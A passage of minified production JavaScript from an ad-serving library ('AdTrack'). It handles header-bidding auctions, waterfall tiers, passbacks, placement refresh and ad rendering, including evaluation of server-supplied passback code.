              g > 0 && (this.minFP <= 0 || g < this.minFP) && (this.minFP = g);
            }
          }
          this.track.lastNTHBTier++, this.track.nthbSuccess = !1, this.track.nthb = AdTrack.NTHB(this.hbId, this.track.lastNTHBTier, this.track.reporting, t.waterfall.id, i, this.tierId), this.track.isHB && AdTrack.hb2.connectNthb(this.track.unitID, this.track.nthb), this.track.hbAuctionTimeouted && this.forceEvaluation(), t.options.noAsync ? this.hbTimer = null : this.hbTimer = setTimeout(function () {
            this.evalHB(!0);
          }.bind(this), this.timeout);
          var m = function (e) {
            return function () {
              try {
                try {
                  var i = this.track.getChannelCount(this.channels[e].chd.keys);
                } catch (t) {
                  throw this.track.doError("Error while running bid - getChannelCount (" + e + ") " + t.message), t;
                }
                try {
                  var n = this.getKey(this.channels[e].chd, this.track.getStyles(this.channels[e]));
                } catch (t) {
                  throw this.track.doError("Error while running bid - getKey (" + e + ") " + t.message), t;
                }
                try {
                  this.requestStarts[e] = AdTrack.Utils.time(), this.hbChannels[e] = this.getChannel(t, this.channels[e]), this.hbChannels[e].state = "send_bid";
                } catch (t) {
                  throw this.track.doError("Error while running bid - extension extra (" + e + ") " + t.message), t;
                }
                try {
                  r(t, this.channels[e].chd, i, this.hbChannels[e]);
                } catch (t) {
                  throw this.track.doError("Error while running bid - bidRequest (" + e + ") " + t.message), t;
                }
                try {
                  var s = function () {
                    this.hbChannels[e].bid(function (t, i) {
                      try {
                        var r = new AdTrack.NTHB.Bid(this.hbChannels[e], this.channels[e], e, t, this.minFP, this.track.isNTHB);
                        if (!t || this.hbTimeouted || this.hbEvaluated || this.hbId !== this.track.nthb.getId() || this.track.nthb.addBid(r), !this.hasResponse && r.isValid() && (this.hasResponse = !0), this.hbChannels[e].chd.pending = !1, this.hbResponses++, 0 == this.hbTimeouted ? this.hbChannels[e].state = "response_return" : this.hbChannels[e].state = "timeout", this.hbChannels[e].responseTime = AdTrack.Utils.time() - this.requestStarts[e], this.hbEvalForced && this.hasResponse && !this.hbEvaluated && !this.track.definition.options.hb.stopAuction) return this.hbTimer && clearTimeout(this.hbTimer), void this.evalHB(!0);
                        this.hbResponses + this.hbSkipped == this.hbChannels.length && (this.hbTimer && clearTimeout(this.hbTimer), this.evalHB(!1));
                      } catch (t) {
                        this.track.doError("Error processing bid response - " + t.message);
                      }
                    }.bind(this), n);
                  }.bind(this);
                } catch (t) {
                  throw this.track.doError("Error while running bid - trigger (" + e + ") " + t.message), t;
                }
                var a = this.hbChannels[e].chd.delay;
                a ? setTimeout(s, a) : s();
              } catch (t) {
                var o = "";
                this.channels && this.channels[e] && this.channels[e].chd && this.channels[e].chd.tag && (o = this.channels[e].chd.tag), this.track.isHB ? AdTrack.Prebid.error("Error while running bid (" + o + ") - " + t.message) : this.track.doError("Error while running bid (" + o + ") - " + t.message);
              }
            };
          };
          for (a = 0; a < this.channels.length; a++) {
            var k = this.channels[a].tp;
            this.channels[a].chd.tag, this.channels[a].chd.flag;
            if (void 0 === k || "function" != typeof AdTrack.Utils.throughput || AdTrack.Utils.throughput(k)) {
              if (this.skippedChannels[a] || this.nthb2SkippedChannels[a]) this.hbSkipped++;else {
                var b = this.channels[a].chd;
                if (b && b.type && "tag" === b.type) try {
                  if (b && "google-dfp-vgn" === b.tag) {
                    this.track.doError("Google vignette not allowed in HB");
                    continue;
                  }
                  if (this.track.isHB) {
                    this.track.doError("NonHB not allowed in prebid");
                    continue;
                  }
                  if (this.track.isNTHB2) {
                    this.track.doError("NonHB not allowed in NTHB2");
                    continue;
                  }
                  var v = this.getChannel(t, this.channels[a]),
                    A = AdTrack.Price.create(this.channels[a].floor, AdTrack.Price.CZK),
                    T = new AdTrack.NTHB.Bid(v, this.channels[a], a, A);
                  (this.hbTimeouted || this.hbEvaluated || this.hbId !== this.track.nthb.getId()) && this.track.doError("Unexpected hb state while processing nonHb channel"), this.track.nthb.addBid(T);
                } catch (t) {
                  this.track.doError("Exception while processing nonHb channel: " + t.message);
                } else {
                  var y = m(a).bind(this);
                  t.options.noAsync ? y() : this.track.isHB ? y() : setTimeout(y, 1);
                }
              }
            } else this.hbSkipped++, this.track.evFilteredRequest(t, this.channels[a].chd);
          }
          this.channels.length === this.hbSkipped && this.evalHB(!1);
        } else this.track.doError("Unknown tier method " + this.method);
      } catch (t) {
        this.track.doError("Tier run failed: " + t.message);
      }
    },
    forceEvaluation: function () {
      if ("hb" === this.method && !this.hbEvalForced) {
        this.hbEvalForced = !0;
        var t = function () {
          this.hbTimer && clearTimeout(this.hbTimer), this.evalHB(!0);
        }.bind(this);
        this.track.definition.options.hb.stopAuction ? t() : this.hasResponse && t();
      }
    },
    getKey: function (t, e) {
      var i = e.product ? e.product.count : null,
        r = e.normal ? e.normal.count : null,
        n = e.product || null,
        s = e.normal || null,
        a = null;
      if (i === r) a = s;else if (null !== r && null === i) a = s;else if (null === r && null !== i) a = n;else {
        this.track.doError("Different parameter count at styles definition - " + r + " (normal) vs " + i + " (product) at channel tag " + t.tag);
        var o = [s, n];
        a = o[Math.floor(Math.random() * o.length)];
      }
      return this.track.getChannelKey(t, a);
    },
    evalHB: function (t) {
      try {
        if (this.hbTimeouted = t, this.hbEvaluated) return;
        this.hbEvaluated = !0, this.hbEnd = new Date().getTime(), this.track.nthb ? this.track.nthb.end() : this.track.doError("NTHB - object not available during evaluation, timeouted: " + t);
        for (var e, i = this.track.nthb.getBids(), r = this.track.nthb.hasValidBids(), n = 0; n < i.length; n++) {
          var s = i[n],
            a = s.getChannel(),
            o = s.getIndex();
          if (!s.nonHb) {
            var d = !1;
            if (!e && r && (e = s, d = !0), a && a.state && "response_return" === a.state) {
              var c = d ? 1 : 0,
                h = a.price ? a.price.getPrice() : null;
              this.track.evBidResponse(null, a.chd, h, c, a.responseTime, this.channels[o].floor, this.channels[o].sfc, a.uib);
            }
          }
        }
        AdTrack.UserSync && AdTrack.UserSync.syncUsers && AdTrack.UserSync.syncUsers(5e3);
        var l = function () {
          this.track.nthb = null, this.track.passback(this.definition, null);
        }.bind(this);
        if (this.track.isHB) this.track.nthb.hasValidBids() ? AdTrack.hb2.finishUnit(this.track.unitID) : l();else {
          var u = this.track.nthb.getNext(!0);
          if (u) {
            var p = u.getChannel(),
              f = u.getIndex();
            if (this.track.t = f, r) {
              this.track.nthbSuccess = !0;
              var g = e.getChannel(),
                m = g.price ? g.price.getPrice() : null;
              this.track.renderer.on("ready", function () {
                if (p !== g && !u.nonHb) try {
                  var t = "";
                  u.getAuctionPrice() < m && (t += "nthb<;");
                  var e = p.chd.tag + p.chd.flag,
                    i = g.chd.tag + g.chd.flag,
                    r = p.price.getPrice(),
                    n = g.price.getPrice(),
                    s = p.price.isDeal() + "-" + g.price.isDeal();
                  u.getAuctionPrice() !== r && (t += "inconsistent");
                  var a = this.track.nthb.getDisplayed();
                  this.track.doError("NTHB - highest bid differs, tag: " + (e !== i) + ", price: " + (r !== n) + ", deals: " + s + ", count: " + a.length + ", timeout: " + this.hbTimeouted + (t ? ", errors: " + t : ""));
                } catch (t) {
                  this.track.doError("NTHB - highest bid differs - error: " + t.message);
                }
              }.bind(this));
            }
            this.callback(p, this.track.getStyles(this.channels[f]));
          } else l();
        }
        var k = this.track;
        if (k.isHB) {
          var b = "mobile" === k.type ? 1 : 0,
            v = k.definition.options.hb.prebidAdUnitsPath || "pbjs.adUnits";
          AdTrack.pbUnitsLookUp.slowLookUp(v, function (t) {
            t ? AdTrack.Utils.isInPrebidAdUnits(t, k.domain, k.group, k.position, b) ? k.evPbjAdUnits(!0, !0, AdTrack.Utils.time() - AdTrack.startTime) : k.evPbjAdUnits(!0, !1, AdTrack.Utils.time() - AdTrack.startTime) : k.evPbjAdUnits(!1, !1, AdTrack.Utils.time() - AdTrack.startTime);
          });
        }
      } catch (t) {
        this.track.doError("Error in HB evaluation - " + t.message);
      }
    }
  }, AdTrack.Dispatcher.prototype = {
    getDefinition: function () {
      var url = "";
      url = this.aaproxy ? this.aaproxy + "?" : "//" + this.server + "/get/" + encodeURIComponent(this.domain) + "/" + encodeURIComponent(this.group) + "/" + encodeURIComponent(this.position) + "/" + ("mobile" == this.type ? "mobile" : "classic"), url += "?" + AdTrack.Utils.uri("ext[dpi]", AdTrack.Utils.getDPI()) + "&", AdTrack.BrowserFlags.isPhone && (270 == window.orientation || 90 == window.orientation || -90 == window.orientation) ? url += AdTrack.Utils.uri("ext[screenWidth]", screen.height) + "&" + AdTrack.Utils.uri("ext[screenHeight]", screen.width) : url += AdTrack.Utils.uri("ext[screenWidth]", screen.width) + "&" + AdTrack.Utils.uri("ext[screenHeight]", screen.height), url += "&" + AdTrack.Utils.uri("ext[mobile]", AdTrack.Utils.isMobile() ? 1 : 0), AdTrack.BrowserFlags.isOldIE && (url += "&" + AdTrack.Utils.uri("ext[isOldIE]", 1)), AdTrack.BrowserFlags.isIE && (url += "&" + AdTrack.Utils.uri("ext[isIE]", 1)), AdTrack.BrowserFlags.isOldOpera && (url += "&" + AdTrack.Utils.uri("ext[isOldOpera]", 1)), AdTrack.BrowserFlags.isFirefox && (url += "&" + AdTrack.Utils.uri("ext[isFirefox]", 1)), AdTrack.BrowserFlags.isPhone && (url += "&" + AdTrack.Utils.uri("ext[isPhone]", 1)), AdTrack.BrowserFlags.isOldAndroid && (url += "&" + AdTrack.Utils.uri("ext[isOldAndroid]", 1)), this.settings.isPreview && (url += "&" + AdTrack.Utils.uri("preview", 1)), this.settings.selfpromo && (url += "&" + AdTrack.Utils.uri("selfpromo", 1)), this.settings.publisher && this.settings.publisher.pbid && (url += "&" + AdTrack.Utils.uri("pbid", this.settings.publisher.pbid)), this.settings.publisher && this.settings.publisher.imp && (url += "&" + AdTrack.Utils.uri("imp", this.settings.publisher.imp)), this.jsonp(url, "dclbk", function (definition) {
        if (definition) {
          if ("request-error" !== definition && "request-timeouted" !== definition) this.definition = definition, this.definition.placementId = this.unitID, this.definitionWrapper = new AdTrack.Definition(definition), definition.options.noAsync ? this.doError("Syncronous not supported for late rendering") : this.tryToRun(definition);else {
            var callbackName = ("adTrackJSONP" + Math.random()).replace(".", "");
            window[callbackName] = function (t) {
              delete window[callbackName], this.tryToRun(t);
            }.bind(this), AdTrack.Ajax.request({
              label: "Late definition",
              url: url + "&dclbk=" + callbackName,
              method: "GET",
              timeout: 0,
              headers: {},
              ontimeout: function () {
                this.doError("Late definition ajax ontimeout", "info");
              }.bind(this),
              onerror: function () {}.bind(this)
            }, this.errorReporting).done(function (ads) {
              eval(ads);
            }.bind(this)).fail(function (t, e) {
              this.doError("Late definition ajax FAIL (" + (e ? "timeouted" : "error") + ")" + t, "info");
            }.bind(this)).send();
          }
        } else this.doError("No definition (" + typeof definition + ") sent for late loading");
      }.bind(this), 0);
    },
    getStyles: function (t) {
      if (t.orientation) {
        var e = AdTrack.Utils.getOrientation(),
          i = t.orientation[e],
          r = t.chd ? t.chd.tag : void 0;
        return i || this.doError("Oriented styles - missing " + e + " (" + r + ")"), i.normal || i.product || this.doError("Oriented styles - incorrect nesting (" + r + ")"), i;
      }
      return t.styles;
    },
    tryToRun: function (definition) {
      var _startPlacement = function () {
          this.start(definition);
        }.bind(this),
        _passbackPlacement = function () {
          this.evPlacementPassback(), definition.waterfall.passback && eval(definition.waterfall.passback), definition.options.onPassback && eval(definition.options.onPassback);
        }.bind(this);
      if (definition.options.customMultipleAds && (AdTrack.static[this.unitID] || (AdTrack.static[this.unitID] = 0), AdTrack.static[this.unitID]++, definition.options.dom.multipleAdsCounter = AdTrack.static[this.unitID]), !definition.options.mobileOnly || AdTrack.Utils.isMobile(definition.options.checkScreenSize, definition.options.screenSizeThreshold)) {
        if (definition.options.desktopOnly && AdTrack.Utils.isMobile(definition.options.checkScreenSize, definition.options.screenSizeThreshold)) _passbackPlacement();else {
          if (definition.options.maxScreenSize && AdTrack.Utils.screenDiagonal(screen.width, screen.height) > definition.options.maxScreenSize) return this.metrics.evUnfilledImp("screenSize"), void _passbackPlacement();
          this.unitID && -1 !== this.unitID.getName().search("hp.prosvet.cz_generic_branding") && (definition.options.preRunCondition = "(function () {if(AdTrack.Utils.isMobile()){definition.options.noAsync=false; return false;} return true;})();");
          try {
            if (definition.options.preRunCondition && !eval(definition.options.preRunCondition)) return void _passbackPlacement();
          } catch (t) {}
          if (definition.options.hb && definition.options.hb.onlyPrebid && definition.options.hb.prebidAdUnitsPath && !definition.options.noAsync) {
            var d = this.domain,
              g = this.group,
              p = this.position,
              m = "mobile" === this.type ? 1 : 0;
            AdTrack.pbUnitsLookUp.fastLookUp(definition.options.hb.prebidAdUnitsPath, function (t) {
              t && 0 !== t.length ? AdTrack.Utils.isInPrebidAdUnits(t, d, g, p, m) && (this.prebidUnit = !0, _startPlacement()) : _startPlacement();
            }.bind(this));
          } else _startPlacement();
        }
      } else _passbackPlacement();
    },
    start: function (definition) {
      try {
        this.evAdStart(definition.waterfall ? definition.waterfall.id : null), definition.macros = {}, this.definition = definition, this.pass = 0, definition.options.publisher && definition.options.publisher.pbid && (definition.macros.pbid = definition.options.publisher.pbid), definition.options.publisher && "mafra" === definition.options.publisher.tag && ("undefined" == typeof Ads && (window.Ads = {}), Ads.adserver = "sas", definition.options.noAsync = !1, definition.options.compound = !1, !definition.options.publisher.pbid && definition.waterfall.passback && this.doError("Missing parameter pbid"));
        var cswl = definition.options.customCsyncWhiteList,
          csbl = definition.options.customCsyncBlackList;
        cswl && (definition.options.customCsyncWhiteList = "string" == typeof cswl ? cswl.split(",") : null), csbl && "string" == typeof csbl && (definition.options.customCsyncBlackList = "string" == typeof csbl ? csbl.split(",") : null), AdTrack.Price.setCurrencySettings(definition.currencies), this.isHB = !!definition.options.hb, this.isNTHB2 = !!this.getOption("nthb2"), this.isNTHB = !!this.getOption("nthb") || this.isNTHB2;
        var multiImp = !!this.getOption("multiImp");
        if (this.multi = multiImp || this.isNTHB || this.isNTHB2 ? {
          load: 0,
          pb: 0,
          stop: !1
        } : null, this.cycleTime = Number(this.getOption("cycleTime") || 60), this.skip = {}, this.isHB && (this.pbjValidation && this.pbjValidation.reset(), this.evPbjCall(AdTrack.Utils.time() - AdTrack.startTime), AdTrack.Prebid && AdTrack.Prebid.version || this.doError("Prebid not connected")), this.window = window, definition.options.topFrame) try {
          window.top && window.top.document && (this.window = window.top);
        } catch (t) {
          return void this.doError("Unable to perform topFrame rendering");
        }
        if (this.document = this.window.document, this.transforms = AdTrack.DOM.Transforms.getTransforms(this.document), definition.options.dom && definition.options.dom.stopElement) {
          var sc = this.document.querySelector(definition.options.dom.stopElement);
          if (sc) return;
        }
        if (definition.options.dom && definition.options.dom.changeElement) {
          var cc = this.document.querySelector(definition.options.dom.changeElement);
          cc && definition.options.dom.selectorReplacement && (definition.options.dom.selector = definition.options.dom.selectorReplacement);
        }
        this.viewabilityHandler && this.viewabilityHandler.dispose(), this.renderer && this.renderer.destroy(), this.renderer = new AdTrack.BaseRenderer(this.window, this.definitionWrapper, this.settings, this.transforms, this.errorReporting, this.metrics, "fixed" === this.definition.renderer ? this : null), this.renderer.on("ready", this.evDisplayRequest.bind(this)), this.renderer.on("close", function (t) {
          this.metrics.evClose(t);
        }.bind(this));
        var cid = this.type + "_" + this.domain + "_" + this.group + "_" + this.position;
        if (definition.options.compound) {
          if (definition.options.noAsync) {
            if (AdTrack.units[cid]) {
              if (1 == AdTrack.units[cid].status) ;else if (2 == AdTrack.units[cid].status) {
                var ch = null;
                definition.waterfall.tiers[AdTrack.units[cid].pass - 1].channels[AdTrack.units[cid].t] && (ch = definition.waterfall.tiers[AdTrack.units[cid].pass - 1].channels[AdTrack.units[cid].t]), ch && ch.chd.passback ? eval(ch.chd.passback) : definition.waterfall.passback ? eval(definition.waterfall.passback) : this.doError("Passback is not defined for compound ad");
              } else this.doError("Unexpected status " + AdTrack.units[cid].status + " in compound ad ");
            } else this.runWaterfall(definition);
          } else this.doError("Compound ads cannot be rendered in asynchronous mode");
        } else this.settings.dummyAds || this.settings.selfpromo ? AdTrack.Libs.isAvailable("adtrack-dummy-js") ? this.runWaterfall(definition) : this.dummyAds.onload(function () {
          this.runWaterfall(definition);
        }.bind(this)) : "mobile_r2b2.topzine.cz_generic_300x250" === cid || "classic_r2b2.topzine.cz_generic_970x250" === cid ? AdTrack.CMP.waitForConsent(function () {
          this.runWaterfall(definition);
        }.bind(this), 3e3) : this.runWaterfall(definition);
      } catch (t) {
        this.doError("Placement start failed: " + t.message);
      }
    },
    runWaterfall: function (t) {
      try {
        var e = {
          channel: null,
          style: null
        };
        if (this.wfHasLoad = !1, this.lastNTHBTier = 0, this.isHB) {
          if (this.definition.options.noAsync) this.doError("HB not supported for synchronous placements.");else {
            this.definition.options.hb.mappingId = this.definition.options.hb.mappingId || this.unitID.getName();
            this.unitID.getName();
            var i = this.definition.options.hb.mappingId,
              r = this.definition.options.hb.group,
              n = !1;
            this.definition.options.hb.mappingId === this.unitID.getName() && (n = !0, r && this.doError("Groups cant be used for DGPM mapping."));
            var s = this.definition.options.hb.targeting;
            this.definition.options.hb.targeting.setTargeting, t.renderer;
            i && s ? n ? this.openTier(t, this.pass, e) : (this.doError("Only dgpm mapping allowed"), setTimeout(function () {
              this.openTier(t, this.pass, e);
            }.bind(this), 100)) : this.doError("Missing some HB requirements.");
          }
        } else this.openTier(t, this.pass, e);
      } catch (t) {
        this.doError("Run waterfall failed: " + t.message);
      }
    },
    hbAuctionTimeout: function () {
      this.hbAuctionTimeouted = !0, this.currentTier && this.currentTier.forceEvaluation();
    },
    checkForRefresh: function () {
      var t = this.getOption("disableRefreshOnClose"),
        e = this.getOption("googleNoRefresh"),
        i = this.getOption("seznamNoRefresh"),
        r = this.getOption("refreshPlacement"),
        n = this.getOption("refreshFixed") || this.getOption("refreshTime"),
        s = this.getOption("preloadRefreshTime") || 0,
        a = n && s > 0 && s < n ? s : 0,
        o = this.getOption("mixedSticky"),
        d = this.getOption("noRefreshOnLandscape"),
        c = this.getActualChannel();
      if (o && o > 0 && o <= 1) {
        var h = this.unitID.d + "/autorefresh/" + (Math.random() < o ? "vignette" : "sticky") + "/" + this.unitID.type;
        r || (r = h, this.definition.options.refreshPlacement = h);
      }
      if ((!e || !c || -1 === c.chd.tag.indexOf("google") && "adsense" !== c.chd.tag) && (!i || !c || -1 === c.chd.tag.indexOf("seznam")) && ("vignette" !== this.definition.renderer || this.getOption("loadOnTimeout") || r) && (!a || r && r !== this.unitID.getPath() || (a = 0), !isNaN(n) && !this.refreshTimeout)) {
        var l,
          u,
          p,
          f = n - a,
          g = 1e3 * f,
          m = function () {
            if (clearTimeout(this.refreshTimeout), this.refreshTimeout = null, d && "landscape" === AdTrack.Utils.getOrientation()) {
              var t = function () {
                "portrait" === AdTrack.Utils.getOrientation() && (AdTrack.Utils.removeEvent(this.window, "orientationchange", t), AdTrack.Utils.removeEvent(this.window, "resize", t), this.refreshPlacement(a));
              }.bind(this);
              AdTrack.BrowserFlags.isPhone ? AdTrack.Utils.addEvent(this.window, "orientationchange", t) : AdTrack.Utils.addEvent(this.window, "resize", t);
            } else this.refreshPlacement(a);
          }.bind(this);
        if (("vignette" === this.definition.renderer || this.definitionWrapper.getOption("refreshVisibilityTest")) && AdTrack.DOM.Visibility) l = AdTrack.Timer.create(1e3, function (t) {
          t >= f && (AdTrack.DOM.Visibility.removeCallback(u), AdTrack.DOM.Visibility.removeCallback(p), l.stop(), l = null, m());
        }), u = AdTrack.DOM.Visibility.onHidden(function () {
          l.stop();
        }.bind(this)), p = AdTrack.DOM.Visibility.onVisible(function () {
          l.start();
        }.bind(this)), AdTrack.DOM.Visibility.isHidden() || l.start(), this.refreshTimeout = "placeholder";else this.refreshTimeout = setTimeout(m, g);
        t && this.renderer && this.renderer.on("close", function () {
          clearTimeout(this.refreshTimeout), l && l.stop();
        }.bind(this));
      }
    },
    refreshPlacement: function (t) {
      try {
        var e = function () {
          this.renderer && this.renderer.destroy(), this.resetAd();
        }.bind(this);
        t > 0 ? setTimeout(e, 1e3 * t) : e();
        var i,
          r = "",
          n = this.getOption("refreshPlacement");
        r = n && "string" == typeof n ? n : this.unitID.getPath();
        var s = "//" + this.server + "/get/" + r;
        r === this.unitID.getPath() ? (this.definition.waterfall.id && (s += "?wfid=" + this.definition.waterfall.id), i = this.getOption("refreshCounter") || 1) : i = 1, s += -1 !== s.indexOf("?") ? "&" : "?", s += "rc=" + i;
        var a = document.getElementById("adtrack-refresh");
        a || ((a = document.createElement("div")).setAttribute("id", "adtrack-refresh"), document.querySelector("body").appendChild(a)), a.innerHTML = "";
        var o = document.createElement("script");
        a.appendChild(o), o.charset = "UTF-8", o.src = s;
      } catch (t) {
        this.doError("Error while refreshing - " + t.message);
      }
    },
    displayAd: function (t, e, i) {
      var r;
      this.debug("Main", "Display ad." + (t ? "  selector: " + t : "") + (e ? "  adUnit: " + e : ""), AdTrack.Log.INFO);
      var n = "hbDisplayError";
      try {
        if (this.definition.options.dom && this.definition.options.dom.selectorForeign) {
          if ("string" != typeof t) throw n = "hbDisplayNoSelector", new Error("selector not provided.");
          this.definition.options.dom.selector = t;
        }
        if (e && (this.definition.macros.adUnit = e), !i) throw n = "hbDisplayParams", new Error("no bid provided");
        var s = i.creativeId;
        if (this.debug("HB", "Display ad for request: " + s, AdTrack.Log.INFO), !s) throw n = "hbDisplayRequestId", new Error("no request id");
        var a = AdTrack.hb2.getRequest(s);
        if (!a) throw n = "hbDisplayRequest", new Error("didnt find hb request");
        if (!(r = a.getAssignedBid())) throw n = "hbDisplayRequestNoBid", new Error("no bid assigned to the request");
        if (r.displayed) throw 1 === AdTrack.hb2.getNumberOfRequestsForAdUnit(this.unitID) ? (n = "hbDisplayBadRefresh", new Error("bad refresh")) : (n = "hbDisplayMultipleImps", new Error("bid displayed multiple times"));
        r.displayed = !0, this.renderer && this.renderer.destroy(), this.rendered = !1, this.resetAd(), this.renderer = new AdTrack.BaseRenderer(this.window, this.definitionWrapper, this.settings, this.transforms, this.errorReporting, this.metrics, "fixed" === this.definition.renderer ? this : null), this.renderer.on("ready", this.evDisplayRequest.bind(this)), this.renderer.on("close", function (t) {
          this.metrics.evClose(t);
        }.bind(this));
        var o = r.getChannel(),
          d = this.getStyles(r.getWfChannel());
        this.t = r.getIndex(), this.channelMap[this.nthb.getPass()] = o, this.render(this.definition, o, d);
      } catch (t) {
        this.doError("HB display - " + t.message), this.metrics.evUnfilledImp(n);
      }
    },
    show: function () {
      this.renderer && this.renderer.show();
    },
    hide: function () {
      this.renderer && this.renderer.hide();
    },
    resetAd: function () {
      this.transforms && this.transforms.revert(), this.pbjValidation.reset();
    },
    isRendered: function () {
      return this.rendered;
    },
    render: function (definition, channel, styles) {
      try {
        if ("viewport" === this.definition.options.checkWidth) {
          var requiredWidth = channel.chd.requiredWidth ? channel.chd.requiredWidth : channel.chd.width ? channel.chd.width : 0,
            availableWidth = AdTrack.Utils.getViewportRealWidth(this.window);
          if (requiredWidth > availableWidth) return void this.passback(definition, channel.chd);
        }
        if ("idnes.cz" === this.domain && "interscroll" === definition.renderer) {
          var viewport_w = AdTrack.Utils.getViewportRealWidth(this.window),
            viewport_h = AdTrack.Utils.getViewportRealHeight(this.window);
          if (viewport_w <= viewport_h) this.metrics.evProfiling("interscroller orientation - portrait");else if (this.metrics.evProfiling("interscroller orientation - landscape"), definition.waterfall.passback) return void eval(definition.waterfall.passback);
        }
        channel.chd.nonHbBid && this.renderer.on("ready", function () {
          "function" == typeof this.startBidRequest && this.startBidRequest(definition, channel, 4e3);
        }.bind(this)), this.renderer.init(function () {
          this.metrics.evProfiling("initialized", "cnc debug");
          try {
            if (this.renderer.on("destroy", function () {
              "function" == typeof channel.destroy && channel.destroy();
            }), this.viewabilityHandler || (this.viewabilityHandler = AdTrack.Viewability.Handler(), this.viewabilityHandler.addCallback(function () {
              this.metrics.evViewability(0, definition.renderer);
            }.bind(this)), this.viewabilityHandler.addCallback(function (t, e) {
              this.metrics.evViewability(Math.round(e), definition.renderer);
            }.bind(this), 10, 5, 45), this.renderer.on("viewabilityChanged", AdTrack.Viewability.getBasicCallback(this.viewabilityHandler))), channel.MTsupport) channel.render(null, styles, function (t) {
              t ? (t.on("load", function () {
                this.loaded(definition, channel.chd, t.getCount(), t.getStyle(), t.getPassedResponse(), !0), t.isRenderedExternally() || this.renderer.on("impress", function (e, i) {
                  this.evImpress(definition, channel.chd, t.getStyle(), i || 0);
                }.bind(this));
              }.bind(this)), t.on("click", function (e, i, r, n) {
                this.reportClick(definition, channel.chd, e, i, r, n, t.getStyle());
              }.bind(this)), t.isPreloaded() && !definition.options.noAsync && (t.on("preloadDone", function (t, e, i) {
                this.evPreload(channel.chd, t, e, i);
              }.bind(this)), t.on("error", function () {
                this.passback(definition, channel.chd, t.getPassbackReason());
              }.bind(this))), this.metrics.evProfiling("render called", "cnc debug"), this.renderer.render(t)) : this.errorReporting.doError("Channel does not return mediatype.");
            }.bind(this));else {
              this.errorReporting.doError("Deprecated rendering");
              var t = this.renderer.createContainer();
              t ? channel.render(t, styles) : this.errorReporting.doError("Container not available.");
            }
          } catch (t) {
            this.doError("Error rendering " + channel.chd.tag + " - " + t.message);
          }
        }.bind(this));
      } catch (t) {
        this.doError("Error in placement render - " + t.message);
      }
    },
    openTier: function (definition, pass, passbackOption) {
      var chd = null,
        data = null;
      if (definition.waterfall) {
        if (this.shouldReturnDummyAd()) {
          var renderDummy = function () {
            var t = new AdTrack.DummyAds(this, definition);
            this.render(definition, t, null);
          }.bind(this);
          return this.dummyAds ? this.dummyAds.onload(renderDummy) : renderDummy(), !0;
        }
        if (definition.waterfall.tiers.length <= pass) {
          try {
            if (this.multi && (this.multi.pb++, this.multi.load > 0)) {
              if (passbackOption.channel && this.evPassback(definition, passbackOption.channel, passbackOption.reason), !this.getOption("multiDisableRestart") && !this.isNTHB2 && this.multi.pb < 3) {
                var rerun = function () {
                  !0 !== this.multi.stop && (this.pass = 0, this.runWaterfall(this.definition));
                }.bind(this);
                if (this.wfHasLoad) rerun();else {
                  var triggerTime = this.viewabilityHandler.getViewabilityTime() + this.cycleTime;
                  this.viewabilityHandler.addCallback(rerun, triggerTime);
                }
              }
              return !1;
            }
            this.evPlacementPassback(), this.isHB && AdTrack.hb2.finishUnit(this.unitID), definition.options.noAsync && void 0 !== document.readyState && "loading" !== document.readyState && !window.postscribe && this.doError("Possible synchronous passback in async context", "high"), this.settings.publisher && "economia" === this.settings.publisher.tag && "loading" !== document.readyState && (passbackOption.reason = "noPassback"), passbackOption.channel && this.evPassback(definition, passbackOption.channel, passbackOption.reason), definition.waterfall.passback ? ("classic_zpravy.idnes.cz_rtb-premium-article_480x300" === this.unitID.getName() && this.metrics.evProfiling("dispatcher wf passback exists"), eval(definition.waterfall.passback)) : "classic_zpravy.idnes.cz_rtb-premium-article_480x300" === this.unitID.getName() && this.metrics.evProfiling("dispatcher wf passback not exists"), definition.options.onPassback && eval(definition.options.onPassback), passbackOption.channel && passbackOption.channel.passback && eval(passbackOption.channel.passback), this.status = 2, this.renderer.events.trigger("empty"), (this.getOption("refreshFixed") || -1 !== this.unitID.getName().indexOf("autorefresh")) && this.checkForRefresh();
          } catch (t) {
            this.doError("Error in placement passback - " + t.message), "classic_zpravy.idnes.cz_rtb-premium-article_480x300" === this.unitID.getName() && this.metrics.evProfiling("dispatcher passback error: " + t.message);
          }
          return !1;
        }
        try {
          var tierDef = definition.waterfall.tiers[pass],
            tier = new AdTrack.Tier(this, tierDef.method, tierDef.channels, this.skip[pass], tierDef.id);
          this.currentTier = tier, tier.run(definition, function (t, e) {
            this.channelMap[this.pass] = t, this.render(definition, t, e);
          }.bind(this), pass);
        } catch (t) {
          this.doError("Error opening tier - " + t.message);
        }
        return !0;
      }
      if (definition.aagun) {
        tier = new AdTrack.Tier(this, "split", null);
        var ch = definition.aagun.channel,
          data = definition.aagun.data;
        ch.chd && (ch.chd.data = !0);
        var channel = tier.getChannel(definition, ch);
        return channel.data = data, this.render(definition, channel, this.getStyles(ch)), !0;
      }
    },
    passback: function (t, e, i) {
      try {
        this.pass++;
        var r = {
            channel: e,
            reason: i
          },
          n = function () {
            var e = this.nthb.getNext(!0);
            if (e) {
              var i = e.getChannel(),
                n = this.getStyles(e.getWfChannel());
              return this.pass = this.nthb.getPass(), this.t = e.getIndex(), this.channelMap[this.pass] = i, this.render(this.definition, i, n), !0;
            }
            return this.openTier(t, this.pass, r);
          }.bind(this),
          s = function () {
            var e = this.definition.waterfall.tiers[this.pass],
              i = e && "hb" === e.method,
              n = !e,
              s = "function" == typeof this.nthb.hasOnlyValid && this.nthb.hasOnlyValid();
            if (this.nthb.isEmpty()) {
              if (this.nthb = null, !s) for (; e && !i;) this.pass++, i = (e = this.definition.waterfall.tiers[this.pass]) && "hb" === e.method;
            } else if (i || n) return this.multiNext(), !0;
            return this.openTier(t, this.pass, r);
          }.bind(this);
        !0 === (e && e.nonHbBid ? n() : this.isNTHB2 && this.nthb ? s() : this.openTier(t, this.pass, r)) && null !== e && this.evPassback(t, e, i);
      } catch (t) {
        this.doError("Error in passback - " + t.message);
      }
    },
    artificialFormat: function (t, e) {
      var i = function (i) {
        "click" === i && this.reportClick(this.definition, e, 0, 0, null, null, t);
      }.bind(this);
      return {
        data: {
          style: t,
          width: e.width,
          height: e.height,
          chd: e
        },
        trigger: function (t) {
          i(t);
        }
      };
    },
    loaded: function (t, e, i, r, n, s) {
      try {
        !r && t.style && (r = t.style);
        var a = null;
        r && (a = r.name);
        var o = this.getActualChannel();
        if (s || (this.renderer.loaded(this.artificialFormat(r, e)), this.definition.options.dom.noContainer || this.renderer.on("impress", function (i, n) {
          this.evImpress(t, e, r, n || 0);
        }.bind(this))), t.options.publisher && t.options.publisher.imp) if (this.renderer.wrap) {
          var d = document.createElement("img");
